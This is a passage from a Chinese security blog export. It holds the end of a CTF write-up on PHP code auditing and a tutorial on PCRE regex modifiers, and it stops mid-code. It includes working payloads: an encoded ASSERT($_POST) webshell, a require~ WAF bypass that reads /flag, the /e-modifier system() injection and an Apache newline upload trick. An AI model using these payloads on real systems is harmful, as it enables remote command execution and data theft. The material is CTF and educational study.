operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token comment">//</span></code></pre>

<p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p>
<h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'&#123;"secret"'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\"0-9A-Z]*&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">theFirstTimeSetCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_g_r</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
    <span class="token variable">$_m_u</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_h_p</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_m_u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$_g_r</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_h_p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_i</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;"secret":"'</span> <span class="token operator">.</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7200</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$obj</span> <span class="token operator">=</span> @<span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'give_me_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$flag_md5</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"here is your webshell: <span class="token interpolation"><span class="token variable">$shell_path</span></span>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">die</span><span class="token punctuation">;</span></span></code></pre>

<p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p>
<p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p>
<p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret=&#123;&quot;secret&quot;:115&#125;</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p>
<p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//there are some secret waf that you will never know, fuzz me if you can</span>
<span class="token keyword">require</span> <span class="token string double-quoted-string">"hidden_filter.php"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>location.href=\'./index.php\'&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$secret_waf</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//清空session 从头再来</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$_SESSION["</span> <span class="token operator">.</span> <span class="token variable">$code</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"]=false;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">/*
 * When you feel that you are lost, do not give up, fight and move on.
 * Being a hacker is not easy, it requires effort and sacrifice.
 * But remember … we are legion!
 *  ————Deep CTF 2020
*/</span></span></code></pre>

<p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p>
<ul>
<li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li>
<li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li>
<li>使用<code>require</code>可以不需要括号</li>
<li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li>
</ul>
<p>得到<code>flag.txt</code>内容：</p>
<pre class="language-none"><code class="language-none">可以，说明你ctfshow的红包2没白做，flag在&#x2F;flag，同样的方法去读取吧。1]&#x3D;false;</code></pre>

<p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php正则表达式(PCRE)模式修饰符</title>
    <url>/posts/57833c1a/</url>
    <content><![CDATA[<p>php单双引号的区别：</p>
<p>单引号：php不会读取里面的变量，作为纯字符串处理</p>
<p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p>
<p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html">详见</a></p>
<span id="more"></span>

<h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>使得模式大小写不敏感</p>
<p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p>
<h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>使得模式匹配上任意行之后就返回true</p>
<p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p>
<p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p>
<h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>使得<code>.</code>可以匹配换行符</p>
<p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p>
<h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>使得<code>$</code>不匹配换行符</p>
<p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p>
<h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>使得可以在模式中添加注释</p>
<p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p>
<h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p>
<p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p>
<p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>$&#123;&#125;</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a>的原因，<code>$&#123;&#125;</code>中包裹的字符则会当做代码执行</p>
<h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p>
<h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" loading="lazy">

<h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p>
<h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p>
<h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p>
<h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p>
<h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><strong>$匹配换行问题</strong></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p>
<p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p>
<p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p>
<p>那么该如何解决这种问题呢？</p>
<p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p>
<ul>
<li><code>^</code></li>
<li><code>$</code></li>
<li><code>\A</code></li>
<li><code>\Z</code></li>
<li><code>\z</code></li>
</ul>
<p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p>
<h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><strong>正则替换</strong></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p>
<p>有如下代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
